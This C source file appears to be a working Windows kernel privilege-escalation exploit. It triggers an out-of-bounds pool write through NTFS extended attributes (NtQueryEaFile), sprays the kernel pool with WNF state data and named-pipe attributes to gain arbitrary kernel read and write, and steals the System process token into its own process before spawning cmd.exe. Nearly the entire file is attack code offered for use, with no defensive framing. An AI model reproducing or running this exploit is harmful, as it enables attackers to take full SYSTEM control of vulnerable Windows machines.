// NTFS.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <winternl.h>
#include <stdbool.h>
#include <winioctl.h>

#pragma comment(lib,"ntdll.lib")

//#include <ntddk.h>
//#include <ntifs.h>
#include "windows_struct.h"
#include "helper.h"
#include "wnf.h"
#include "winver.h"
int ab_read(void* addr, void* dst, int size);

void getFilePath(WCHAR* buffer,int size) {
	//WCHAR path[MAX_PATH];
	//GetCurrentDirectory(MAX_PATH, path);
	WCHAR tmpbuf[0x100];
	GetTempPathW(sizeof(tmpbuf)/2, tmpbuf);
	wsprintf(buffer,L"\\??\\\\%s%s",tmpbuf, L".tmp");
}

int EA_append(UCHAR* head,int dst_size, char* name, UCHAR* value, int value_length) {
	UCHAR* dst = head;
	PFILE_FULL_EA_INFORMATION tmp;
	if (value_length == -1)
		value_length = strlen(value);
	while (1) {
		if (*(ULONG*)dst == 0) {
			tmp = dst;
			if (tmp->EaNameLength == 0) {
				// first init
				tmp = dst;
			}else {
				tmp->NextEntryOffset = ALIGN(tmp->EaNameLength + tmp->EaValueLength + 9, 4);
				tmp = dst + tmp->NextEntryOffset;
			}
			break;
		}
		dst += *(ULONG*)dst;
		if (dst - head > dst_size)
			return 1;
	}
	if ((UCHAR*)tmp + ALIGN(strlen(name) + value_length + 9,4) - head > dst_size)
		return 1;
	tmp->NextEntryOffset = 0;
	tmp->EaNameLength = (UCHAR)strlen(name);
	tmp->EaValueLength = (USHORT)value_length;
	memcpy(tmp->EaName, name, (size_t)tmp->EaNameLength + 1);
	memcpy(tmp->EaName + tmp->EaNameLength + 1, value, value_length);
	return 0;
}
void Ea_show(UCHAR* head) {
	int idx = 0;
	while (1) {
		PFILE_FULL_EA_INFORMATION tmp = (PFILE_FULL_EA_INFORMATION)head;
		DEBUG("EA[%d] name: %s,value: %*s\n", idx++, tmp->EaName,tmp->EaValueLength, tmp->EaName + tmp->EaNameLength + 1);
		if (*(ULONG*)head == 0) {
			break;
		}
		head += *(ULONG*)head;
	}
}
void Ealist_append(UCHAR* head,int dst_size, UCHAR* name) {
	UCHAR* dst = head;
	PFILE_GET_EA_INFORMATION tmp;
	while (1) {
		if (*(ULONG*)dst == 0) {
			tmp = dst;
			if (tmp->EaNameLength == 0) {
				// first init
				tmp = dst;
			}
			else {
				tmp->NextEntryOffset = ALIGN(tmp->EaNameLength + 6, 4);
				tmp = dst + tmp->NextEntryOffset;
			}
			break;
		}
		dst += *(ULONG*)dst;
		if (dst - head > dst_size)
			return 1;
	}
	if ((UCHAR*)tmp + ALIGN(strlen(name) + 6, 4) - head > dst_size)
		return 1;
	tmp->EaNameLength = strlen(name);
	memcpy(tmp->EaName, name, (size_t)tmp->EaNameLength + 1);
	tmp->NextEntryOffset = 0;
}

PIPES pipes;
static PWNF_STATE_NAME oobst;
static char attackName[0x100];
static WNF_STATE_NAME abwrite_st;
static UCHAR eablock[0x40000];
static int exploit()
{
	HANDLE fileHandle;
	IO_STATUS_BLOCK fileStatus;
	UNICODE_STRING ucFilepath;
	WCHAR wcFilepath[200];
	IO_STATUS_BLOCK ioBlock;
	getFilePath(wcFilepath,200);
	RtlInitUnicodeString(&ucFilepath, wcFilepath);
	OBJECT_ATTRIBUTES myAttributes;
	InitializeObjectAttributes(&myAttributes, &ucFilepath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	// delete if exits
	//NtDeleteFile(&myAttributes);
	memset(eablock, 0, sizeof(eablock));
	memset(&pipes, 0, sizeof(pipes));
	memset(attackName, 0, sizeof(attackName));
	static char oob[0x1000]; 
#define CHUNK_SIZE 0xB0
	// overwrite Wnf header
	PoolHeader* fake_hdr =(PoolHeader*) oob;
	fake_hdr->previousSize = 0;
	fake_hdr->poolIndex = 0;
	fake_hdr->blockSize = (CHUNK_SIZE>>4) + 1;
	fake_hdr->poolType = 0x3;
	fake_hdr->processBilled = 0;
	fake_hdr->tag = 0x41414141;
	PWNF_STATE_DATA fake_wnf = (PWNF_STATE_DATA)(oob + 0x10);
	fake_wnf->AllocatedSize = 0xffff;
	fake_wnf->DataSize = 0x3cc;

	char headbuf[CHUNK_SIZE - 9 - 4 - 1 - 0xf + 1];
	memset(headbuf, 'a', sizeof(headbuf));
	int head_len = sizeof(headbuf) + 4 + 9 + 1;
	int padding = (head_len + 3) & 0xfffffffc - head_len;
	EA_append(eablock, sizeof(eablock), "aaaa", headbuf, sizeof(headbuf)); // 4 + 0x180 - 9 - 4 + 9 = 19 padding = 1
	EA_append(eablock, sizeof(eablock), "bbb", oob, 0x20); // 9+4+1
	EA_append(eablock, sizeof(eablock), "cccb", "ccccccc", -1);
	//Ea_show(eablock);
	long mystatus = NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &myAttributes, &fileStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
		FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, eablock, NULL);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtCreateFile failed %x\n", mystatus);
		goto die;
	}
	mystatus = NtSetEaFile(fileHandle, &ioBlock, eablock, sizeof(eablock));
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtSetEaFile fail 0x%x\n", mystatus);
		goto die;
	}
	NtClose(fileHandle);
	fileHandle = 0;
	mystatus = NtCreateFile(&fileHandle, FILE_GENERIC_READ, &myAttributes, &fileStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
		FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtOpenFile fail\n");
		goto die;
	}
	static WNF_STATE_NAME stateNames[0x2000];
	SECURITY_DESCRIPTOR psd;
	InitializeSecurityDescriptor(&psd, SECURITY_DESCRIPTOR_REVISION); 
	for (int i = 0; i < 0x1000; i++) {
		mystatus = NtCreateWnfStateName(&stateNames[i], WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &psd);
		if (!NT_SUCCESS(mystatus)) {
			DEBUG("NtCreateWnfStateName fail %x\n", mystatus);
			return 1;
		}
	}
	for (int i = 0; i < 0x1000; i++) {
		char stateData[CHUNK_SIZE - 0x10];
		memset(&stateData, 'a', sizeof(stateData));
		mystatus = NtUpdateWnfStateData(&stateNames[i], stateData, sizeof(stateData), 0, 0, 0, 0);
		if (!NT_SUCCESS(mystatus)) {
			DEBUG("NtUpdateWnfStateData fail %x\n", mystatus);
			return 1;
		}
	}
	UCHAR* eaList = calloc(0x1000, 1);
	Ealist_append(eaList, 0x1000, "aaaa");
	Ealist_append(eaList, 0x1000, "bbb");
	memset(eablock, 0, (size_t)(head_len + padding));

	// trigger oob write
	mystatus = NtQueryEaFile(fileHandle, &ioBlock, eablock, head_len + padding, FALSE, eaList, 0x1000, NULL, TRUE);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtQueryEaFile fail 0x%x\n", mystatus);
		return 1;
	}
	// overwrite WNF struct
	char readData[0x3000];
	ULONG readDataSize;

	int target_idx = -1;
	WNF_CHANGE_STAMP stamp;
	for (int i = 0; i < 0x1000; i++) {
		readDataSize = sizeof(readData);
		mystatus = NtQueryWnfStateData(&stateNames[i],0,0,&stamp, readData, &readDataSize);
		if (!NT_SUCCESS(mystatus)) {
			DEBUG("NtQueryWnfStateData fail %x\n", mystatus);
			goto die;
		}
		if (readDataSize == 0x3cc) {
			target_idx = i;
			DEBUG("NtQueryWnfStateData find leak success!\n");
			break;
		}
	}
	if (target_idx == -1)
		goto die;
	// free other Wnf Struct
	oobst = &stateNames[target_idx];
	for (int i = 0; i < 0x1000; i++) {
		if (i == target_idx)
			continue;
		mystatus = NtDeleteWnfStateData(&stateNames[i],0);
		if (!NT_SUCCESS(mystatus)) {
			DEBUG("NtDeleteWnfStateData fail %x\n", mystatus);
			goto die;
		}
	}
	// spray using Pipe
	pipe_init(&pipes);
	char name_buf[0x100];
	char value_buf[CHUNK_SIZE];
	for (int i = 0; i < 0x1000; i++) {
		snprintf(name_buf, sizeof(name_buf), "aa_%04d", i);
		*(ULONG*)value_buf = i;
		//fake pool header
		int ret = pipe_write_attr(&pipes, name_buf, value_buf, CHUNK_SIZE - 0x30);
		if (ret)
			goto die;
	}
	NtQueryWnfStateData(oobst, 0, 0, &stamp, readData, &readDataSize);
	PipeAttr* pa = (PipeAttr*)(readData + CHUNK_SIZE);
	DEBUG("PipeAttr->name ptr: %p\n", pa->name);
	if ((ULONGLONG)pa->name >> 48 != 0xffff)
		goto die;
	ULONG pipe_idx = *(ULONG*)(readData + CHUNK_SIZE + 0x30);
	if (pipe_idx > 0x1000) {
		DEBUG("leak data is not PipeAttribute\n");
		goto die;
	}
	snprintf(attackName, sizeof(attackName), "aa_%04d", pipe_idx);
	// free left attr
	for (int i = 0; i < 0x1000; i++) {
		if (i == pipe_idx)
			continue;
		snprintf(name_buf, sizeof(name_buf), "aa_%04d", i);
		int ret = pipe_delete_attr(&pipes, name_buf);
		if (ret)
			goto die;
	}
	// abread done
	DEBUG("Attack Pipe Attr Key: %s\n", attackName);
	char leak_buf[0x100];
	if (ab_read(pa->name, leak_buf, 0x100)) {
		return 1;
	}
	DEBUG("abread test: %s == %s\n", attackName, leak_buf);
	
	// spray State Name Instance
	for (int i = 0; i < 0x2000; i++) {
		if (i == target_idx)
			continue;
		mystatus = NtCreateWnfStateName(&stateNames[i], WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &psd);
		if (!NT_SUCCESS(mystatus)) {
			printf("NtCreateWnfStateName fail %x\n", mystatus);
			goto die;
		}
	}
	UCHAR* heap_ptr = pa->name;
	WNF_NAME_INSTANCE* wnf_name = (WNF_NAME_INSTANCE*)(heap_ptr - 0x18 + CHUNK_SIZE);
	WNF_NAME_INSTANCE tmp_name;
	DEBUG("wnf_name buffer: %p\n", wnf_name);
	if (ab_read(wnf_name, &tmp_name, sizeof(tmp_name))) {
		DEBUG("ab_read fail\n");
		goto die;
	}
	if(tmp_name.Header.NodeTypeCode != 0x903){
		DEBUG("leaked data is not wnf instance\n");
		goto die;
	}
	//find which wnf instance
	memcpy(&abwrite_st,&tmp_name.StateName,sizeof(abwrite_st));
	abwrite_st ^= 0x41C64E6DA3BC0074;
	//getchar();
	//return 0;
	/*
	Using _EPROCESS.ActiveProcessLinks.Flink linked list we’re able to iterate over processes. 
	Every iteration we need to check if UniqueProcessId equals 4 as that’s the System process PID.
	*/
	ULONGLONG eprocess = (ULONGLONG)tmp_name.CreatorProcess;
	ULONG process_id_offset;
	ULONG token_offset;
	ULONG link_offset;
	if (locate_exp_offset(eprocess, &process_id_offset, &token_offset, &link_offset))
		goto die;

	// we need locate process id offset
	ULONGLONG token_addr = eprocess + token_offset;
	UCHAR* begin_eprocess = eprocess;
	while (1) {
		ULONGLONG process_id;
		ab_read(eprocess + process_id_offset, &process_id, 8);
		if (process_id == 4) {
			break;
		}
		UCHAR* tmp;
		ab_read(eprocess + link_offset, &tmp, 8);
		tmp -= link_offset;
		if (tmp == begin_eprocess) {
			break;
		}
		eprocess = tmp;
	}
	ULONGLONG token;
	ab_read(eprocess + token_offset,&token, 8);
	DEBUG("system token %016llx\n", token);
	// write system token to self process
	// write wnf_state_data pointer first
	readDataSize = 0x3cc;
	mystatus = NtQueryWnfStateData(oobst, 0, 0, &stamp, readData, &readDataSize);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtQueryWnfStateData fail %x\n", mystatus);
		goto die;
	}
	//wnf_name = (WNF_NAME_INSTANCE*)(readData + 2*CHUNK_SIZE + 0x10);
	char write_buf[0x48];
	ab_read(begin_eprocess + token_offset - 0x40, write_buf, 0x48);
	//getchar();
	wnf_name = readData + 2 * CHUNK_SIZE + 0x10;
	*(ULONG*)readData = 0xdeadbeef;
	wnf_name->StateData = (WNF_STATE_DATA*)(token_addr - 0x50); // use CreateTime as header
	DEBUG("modify StateData %p\n", wnf_name->StateData);
	mystatus = NtUpdateWnfStateData(oobst, readData, readDataSize, 0, 0, 0, 0);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtUpdateWnfStateData1 fail %x\n", mystatus);
		goto die;
	}
//	printf("modify stateData ptr done!\n");
	int write_size = 0x48;
	*(ULONGLONG*)(write_buf + 0x40) = token;
	mystatus = NtUpdateWnfStateData(&abwrite_st, write_buf, 0x48, 0, 0, 0, 0);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtUpdateWnfStateData2 fail %x\n", mystatus);
		goto die;
	}
	// clear StateData to null after write token
	wnf_name->StateData = 0;
	mystatus = NtUpdateWnfStateData(oobst, readData, readDataSize, 0, 0, 0, 0);
	if (!NT_SUCCESS(mystatus)) {
		DEBUG("NtUpdateWnfStateData1 fail %x\n", mystatus);
		goto die;
	}
	DEBUG("exploit success\n");
	system("cmd.exe");
	return 0;
die:
	if (fileHandle)
		NtClose(fileHandle);
	//close WNF state
	for (int i = 0; i < 0x1000; i++) {
		if (!stateNames[i])
			continue;
		NtCreateWnfStateName(&stateNames[i], WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &psd);
	}
	//close pipes
	pipe_destory(&pipes);
	return 1;
}

int ab_read(void* addr, void* dst, int size) {
	WNF_CHANGE_STAMP stamp;
	char readData[0x400];
	ULONG readDataSize = sizeof(readData);
	NTSTATUS st;
	static char wtf_buf[0x1000];
	st = NtQueryWnfStateData(oobst, 0, 0, &stamp, readData, &readDataSize);
	if (!NT_SUCCESS(st)) {
		DEBUG("NtQueryWnfStateData fail %x\n", st);
		return 1;
	}
	PipeAttr* pa = (PipeAttr*)(readData + CHUNK_SIZE);
	pa->value = addr;
	if (size < 0x20)
		pa->value_len = 0x100;
	else
		pa->value_len = size;
	st = NtUpdateWnfStateData(oobst, readData, readDataSize, 0, 0, 0, 0);
	if (!NT_SUCCESS(st)) {
		DEBUG("NtQueryWnfStateData fail %x\n", st);
		return 1;
	}
	if (pipe_read_attr(&pipes, attackName, wtf_buf, sizeof(wtf_buf))) {
		return 1;
	}
	memcpy(dst, wtf_buf, size);
	return 0;
}

int main() {
	//version_init();
	for (int i = 0; i < 100 && exploit(); i++);
	return 0;
}


